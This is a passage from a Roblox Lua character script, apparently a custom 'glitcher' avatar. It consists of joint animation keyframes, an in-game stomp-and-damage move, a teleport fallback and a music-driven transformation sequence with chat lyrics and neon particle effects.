Animate(LH,cf(-1,0.1,-0.4)*angles(math.rad(-1.4),math.rad(15.3),math.rad(-3.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(0.9,-1,0.2)*angles(math.rad(-17.6),math.rad(-16.3),math.rad(3.2))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,-0.1,-0.2)*angles(math.rad(110.7),math.rad(3.1),math.rad(22.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0,0.1)*angles(math.rad(121.2),math.rad(9.3),math.rad(-13.2)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(44.3),math.rad(-1.3),math.rad(-3.9)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
--Stomped, Targetted dies
soundeffect(429400881,0.95,Heart,1,0,"e")
--explode_residue(5,Heart,Heart.Color,Heart.Material,0,1,1,math.random(1,4)/10,math.random(4,8)/10)
Heart:Destroy()
delay(.2,function()

dmg(targetted)
end)
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .75
Animate(RootJoint,cf(0,0,0.4)*angles(math.rad(-32.9),math.rad(2.8),math.rad(-3))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.7,-1.2)*angles(math.rad(39),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.2,-1.3,-0.5)*angles(math.rad(-18.8),math.rad(-16.4),math.rad(2.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,-0.1,-0.2)*angles(math.rad(-53.7),math.rad(-10.2),math.rad(-19.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0,0.1)*angles(math.rad(-39.6),math.rad(-4.4),math.rad(15.5)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(31.6),math.rad(-0.4),math.rad(-4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)


for i = 0,4,0.1 do
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0.4)*angles(math.rad(-32.9),math.rad(2.8),math.rad(-3))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.7,-1.2)*angles(math.rad(39),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.2,-1.3,-0.5)*angles(math.rad(-18.8),math.rad(-16.4),math.rad(2.9))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,-0.1,-0.2)*angles(math.rad(-53.7),math.rad(-10.2),math.rad(-19.3)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.6,0,0.1)*angles(math.rad(-39.6),math.rad(-4.4),math.rad(15.5)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(31.6),math.rad(-0.4),math.rad(-4)),Alpha)
end

else
print("No user selected, tping...")
RootPart.Position = mouse.Hit.p
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = 1
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-10.1),math.rad(-38.7),math.rad(-6.3))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.3,-1.2,0.4)*angles(math.rad(0),math.rad(50),math.rad(9.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(5.1),math.rad(-22.1),math.rad(13.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.1,-0.2,-0.5)*angles(math.rad(140.4),math.rad(-15.6),math.rad(60.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.3,0)*angles(math.rad(-3),math.rad(0.9),math.rad(11.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(45.8),math.rad(29.9),math.rad(34)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
end
attack = false
end




function NOTTHISAGAIN() --NOOOO! YOU CAN'T JUST USE THE SAME MODE IN EVERY GLITCHER! Haha Resolute / Determined go brrr

hum.WalkSpeed = 0
ModeOfCharacter = "Transformation"
rdm = math.random(1,10)
if rdm ~= 1 then
DerpzMusic.SoundId = "rbxassetid://2755395143"
DerpzMusic.TimePosition = 47.5
else
DerpzMusic.SoundId = "rbxassetid://790687989" --enable determined easter egg
DerpzMusic.TimePosition = 44
end
DerpzMusic.Pitch = 1
songnameboi = "What? I'm too lazy to put it down. Wait until the transformation ends."
attack = true

repeat swait()

local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1.2,-0.5)*angles(math.rad(-14.1),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.8,-0.8)*angles(math.rad(17.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,1,0.2)*angles(math.rad(39.9),math.rad(-9.2),math.rad(-101.4)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,1.1,0.1)*angles(math.rad(30.5),math.rad(13.7),math.rad(101.1)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(47.3),math.rad(0),math.rad(0)),Alpha)

until DerpzMusic.IsLoaded == true


for i = 0, 53, 0.1 do
swait()
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1.2,-0.5)*angles(math.rad(-14.1),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.8,-0.8)*angles(math.rad(17.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,1,0.2)*angles(math.rad(39.9),math.rad(-9.2),math.rad(-101.4)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,1.1,0.1)*angles(math.rad(30.5),math.rad(13.7),math.rad(101.1)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(47.3),math.rad(0),math.rad(0)),Alpha)
end
chatfunc("We don't care what they say,",20,Derpz_EyeColor,true,"Arcade","Arcade")
for i = 0,4,0.1 do
swait()
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(-20),math.rad(-17.4),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.2,-1.2,-0.5)*angles(math.rad(-14.1),math.rad(17.8),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(0.8,-0.8,-1)*angles(math.rad(17.8),math.rad(17.8),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.7,0.1,-0.5)*angles(math.rad(137.6),math.rad(-16.6),math.rad(36.1)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.3,0.1,-0.5)*angles(math.rad(31.5),math.rad(34.9),math.rad(-13)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(12.4),math.rad(3.3),math.rad(35.7)),Alpha)
end

for i = 0,4,0.1 do
swait()
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(-20),math.rad(-17.4),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.2,-1.2,-0.5)*angles(math.rad(-14.1),math.rad(17.8),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(0.8,-0.8,-1)*angles(math.rad(17.8),math.rad(17.8),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.7,0.1,-0.5)*angles(math.rad(137.6),math.rad(-16.6),math.rad(36.1)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.3,0.1,-0.5)*angles(math.rad(31.5),math.rad(34.9),math.rad(-13)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(10.2),math.rad(2.7),math.rad(-6.2)),Alpha)
end
for i = 0,5,0.1 do
swait()
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(-20),math.rad(-17.4),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.2,-1.2,-0.5)*angles(math.rad(-14.1),math.rad(17.8),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(0.8,-0.8,-1)*angles(math.rad(17.8),math.rad(17.8),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.7,0.1,-0.5)*angles(math.rad(137.6),math.rad(-16.6),math.rad(36.1)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.3,0.1,-0.5)*angles(math.rad(31.5),math.rad(34.9),math.rad(-13)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(12.4),math.rad(3.3),math.rad(60.7)),Alpha)
end
chatfunc("We will be here all day,",20,Derpz_EyeColor,true,"Arcade","Arcade")
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .5
Animate(RootJoint,cf(0,0,0)*angles(math.rad(1.3),math.rad(-36),math.rad(4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1,-0.2)*angles(math.rad(2.5),math.rad(28.8),math.rad(-7.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1,-0.3)*angles(math.rad(-6),math.rad(-15.7),math.rad(5.1))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.3,-0.3)*angles(math.rad(151.8),math.rad(-32.6),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.4,0.4)*angles(math.rad(-24.3),math.rad(-17.8),math.rad(0.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(2.1),math.rad(-5.8),math.rad(34.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

Animate(RootJoint,cf(0,0,0)*angles(math.rad(1.3),math.rad(-36),math.rad(4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1,-0.2)*angles(math.rad(2.5),math.rad(28.8),math.rad(-7.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1,-0.3)*angles(math.rad(-6),math.rad(-15.7),math.rad(5.1))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.3,-0.3)*angles(math.rad(151.8),math.rad(-32.6),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.4,0.4)*angles(math.rad(-24.3),math.rad(-17.8),math.rad(0.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(2.1),math.rad(-5.8),math.rad(34.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

Animate(RootJoint,cf(0,0,0)*angles(math.rad(1.3),math.rad(-36),math.rad(4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.2,-1,-0.3)*angles(math.rad(7.6),math.rad(28.2),math.rad(-9.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1,-0.3)*angles(math.rad(-6),math.rad(-15.7),math.rad(10.8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.6,-0.9)*angles(math.rad(179.5),math.rad(-29.5),math.rad(14.5)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.4,0.4)*angles(math.rad(-8.5),math.rad(-15.9),math.rad(9.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-5.1),math.rad(-9.8),math.rad(33.7)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Sine
Animate(RootJoint,cf(0,0.2,0)*angles(math.rad(1.3),math.rad(-36),math.rad(4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.3,-1.2,-0.3)*angles(math.rad(7.6),math.rad(28.2),math.rad(-9.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1.2,-0.2)*angles(math.rad(-6),math.rad(-15.7),math.rad(10.8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,1.1,-1)*angles(math.rad(179.5),math.rad(-29.5),math.rad(14.5)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.6,0.3)*angles(math.rad(-8.5),math.rad(-15.9),math.rad(9.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(20),math.rad(4.4),math.rad(34.7)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
Animate(RootJoint,cf(0,-0.1,0)*angles(math.rad(1.3),math.rad(-36),math.rad(4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.3,-0.9,-0.3)*angles(math.rad(7.6),math.rad(28.2),math.rad(-9.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1,-0.2)*angles(math.rad(-6),math.rad(-15.7),math.rad(10.8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0,-1)*angles(math.rad(179.5),math.rad(-29.5),math.rad(14.5)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.2,0.3)*angles(math.rad(-8.5),math.rad(-15.9),math.rad(9.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(30.5),math.rad(10.4),math.rad(32.9)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
chatfunc("We'll stay here till it's over...",25,Derpz_EyeColor,true,"Arcade","Arcade")
for i = 0,25,0.1 do
swait()
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,-0.1 + .1 * math.cos(sine/23),0)*angles(math.rad(3.1),math.rad(-70.7),math.rad(6.2))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.3,-0.8- .1 * math.cos(sine/23),0)*angles(math.rad(10.5),math.rad(43.2),math.rad(-13))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.1,-1- .1 * math.cos(sine/23),-0.2)*angles(math.rad(-6),math.rad(-15.7),math.rad(10.8))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.6,-0.2)*angles(math.rad(-1.5),math.rad(-19.1),math.rad(-94.5)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,0.4,0.3)*angles(math.rad(-8.5),math.rad(-15.9),math.rad(4.9)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(48.5 - 3 * math.cos(sine/40)),math.rad(0),math.rad(71)),Alpha)
end
chatfunc("Till the world's out of sight,",25,Derpz_EyeColor,true,"Arcade","Arcade")
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .75
Animate(RootJoint,cf(0,-0.1,0)*angles(math.rad(-1.6),math.rad(-51),math.rad(4.6))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.4,-0.8,0)*angles(math.rad(15.9),math.rad(42.3),math.rad(-17.2))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.9,-0.4)*angles(math.rad(-7.7),math.rad(-15.9),math.rad(14.1))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.5,0)*angles(math.rad(4.6),math.rad(1.5),math.rad(-29)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.2,-0.1,0.5)*angles(math.rad(62.8),math.rad(4.9),math.rad(48.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(29.1),math.rad(12.2),math.rad(42.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .75
Animate(RootJoint,cf(0,-0.1,0)*angles(math.rad(-4.3),math.rad(-51),math.rad(4.6))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.4,-0.8,-0.1)*angles(math.rad(15.5),math.rad(42.4),math.rad(-16.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.9,-0.4)*angles(math.rad(-7.7),math.rad(-15.9),math.rad(16.2))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.2,0.1)*angles(math.rad(19.5),math.rad(-6.7),math.rad(-28.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,1.4,-0.6)*angles(math.rad(136.5),math.rad(48.4),math.rad(9.1)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(36),math.rad(20.5),math.rad(43.4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)


local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .75
 Animate(RootJoint,cf(0,-0.1,0)*angles(math.rad(-4.3),math.rad(-51),math.rad(4.6))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.4,-0.8,-0.1)*angles(math.rad(15.5),math.rad(42.4),math.rad(-16.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.9,-0.4)*angles(math.rad(-7.7),math.rad(-15.9),math.rad(16.2))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.4,0.1)*angles(math.rad(4.2),math.rad(-1.2),math.rad(-8.7)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,1.3,-0.5)*angles(math.rad(173.5),math.rad(53),math.rad(-1.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(50),math.rad(30.2),math.rad(37.3)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .33
 Animate(RootJoint,cf(0,-0.1,0)*angles(math.rad(-9.5),math.rad(-51),math.rad(4.6))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.4,-0.8,0)*angles(math.rad(24.8),math.rad(40),math.rad(-24))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(0.7,-1.2,-0.5)*angles(math.rad(-11.8),math.rad(-16.7),math.rad(24.5))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.7,0.1,0)*angles(math.rad(33.5),math.rad(-13.3),math.rad(-13.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(0.7,-0.1,-0.9)*angles(math.rad(173.5),math.rad(53),math.rad(-1.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(36),math.rad(27.3),math.rad(50)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

chatfunc("We will stand; We will fight,",25,Derpz_EyeColor,true,"Arcade","Arcade")
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.InOut
local animatetime = .5
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-12.7),math.rad(0),math.rad(2.3))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,-0.5)*angles(math.rad(16.7),math.rad(0),math.rad(-4.8))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1.2,-0.4)*angles(math.rad(-16.7),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.4,-0.1)*angles(math.rad(-1.8),math.rad(-14.3),math.rad(-7.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.4,-0.1)*angles(math.rad(-2.2),math.rad(16.2),math.rad(7.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(12.1),math.rad(-3.8),math.rad(0.8)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local animatetime = .7
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-7.1),math.rad(0.2),math.rad(2.3))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,-0.4)*angles(math.rad(11.7),math.rad(0),math.rad(-4.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1.2,-0.2)*angles(math.rad(-11.5),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.3,0)*angles(math.rad(0),math.rad(0),math.rad(-9.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.3,0)*angles(math.rad(0),math.rad(0),math.rad(5.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(0.2),math.rad(-1.5),math.rad(0.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingdir = Enum.EasingDirection.In
local animatetime = .25
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-6.2),math.rad(-21),math.rad(2.5))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,-0.4)*angles(math.rad(13.4),math.rad(21.4),math.rad(-13))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1.2,-0.2)*angles(math.rad(-11.3),math.rad(-7.3),math.rad(1.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.8,0.4)*angles(math.rad(124.9),math.rad(-31.5),math.rad(-1.5)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.2,0.3)*angles(math.rad(128),math.rad(-16.3),math.rad(7.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-0.4),math.rad(-1.6),math.rad(23.9)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .52
 Animate(RootJoint,cf(0,0,0)*angles(math.rad(-15.2),math.rad(-21.2),math.rad(0.7))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-0.9,-0.6)*angles(math.rad(23.9),math.rad(20.2),math.rad(-9.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1.3,0.1)*angles(math.rad(-11.3),math.rad(-7.3),math.rad(1.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0,0)*angles(math.rad(125.5),math.rad(-33.6),math.rad(-14.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,-0.2,-0.3)*angles(math.rad(121.4),math.rad(-12.8),math.rad(-2.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-8.4),math.rad(-4.5),math.rad(23.7)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

chatfunc("IT'S NOT OVER TILL IT'S OVER...",25,Derpz_EyeColor,true,"Arcade","Arcade")
local thing = 0
for i = 0,28,0.1 do
swait()
local thing2 = thing*3
DerpzEff("Block",
{
--Put tween info here, Don't use TweenInfo
Time = .5,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,0+thing,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
EndCFrame = RootPart.CFrame*CFrame.new(0,0+thing,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
Color = Color3.new(1,0,0),
EndColor = Color3.new(.5 * math.cos(sine/20),0,0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(1*thing2,1*thing2,1*thing2),
EndSize = Vector3.new(5*thing2,5*thing2,5*thing2),
Material = "Neon",
Reflectance = 0,
}
)
DerpzEff("ShockwaveTestThingy",
{
--Put tween info here, Don't use TweenInfo
Time = .35,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.new(1,1,1),
EndColor = Color3.new(.5,.5,.5),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(10*thing2,1,10*thing2),
Material = "Neon",
Reflectance = 0,
}
)
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = .25,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,0+thing,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
EndCFrame = RootPart.CFrame*CFrame.new(0,0+thing,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
Color = Color3.new(.5,0,0),
EndColor = Color3.new(1,0,0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(3*thing2,10*thing2,3*thing2),
Material = "Neon",
Reflectance = 0,
}
)
thing = thing + .01
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0+thing*1.5,0)*angles(math.rad(-27.9),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-0.9,-0.6,-0.7)*angles(math.rad(-16.2),math.rad(5.1),math.rad(-8.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.4,-0.8)*angles(math.rad(-24.8),math.rad(0),math.rad(11.8))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-0.6,0.2,-1)*angles(math.rad(-169.4),math.rad(-10.5),math.rad(82.1)),Alpha)
RW.C0 = RW.C0:lerp(cf(0.7,0.4,-0.9)*angles(math.rad(176.6),math.rad(-1.4),math.rad(-79.8)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(63.5),math.rad(0),math.rad(0)),Alpha)
end
soundeffect(SoundTable["Big Explosions"][math.random(1,#SoundTable["Big Explosions"])],1,tors,10,0,"boom")
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = 2,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,100+thing,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(0,100+thing,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.new(.7,0,0),
EndColor = Color3.new(1,0,0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(50,9999,50),
Material = "Neon",
Reflectance = 0,
}
)
for i = 0,5,0.1 do
swait()
DerpzEff("Block",
{
--Put tween info here, Don't use TweenInfo
Time = .5,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
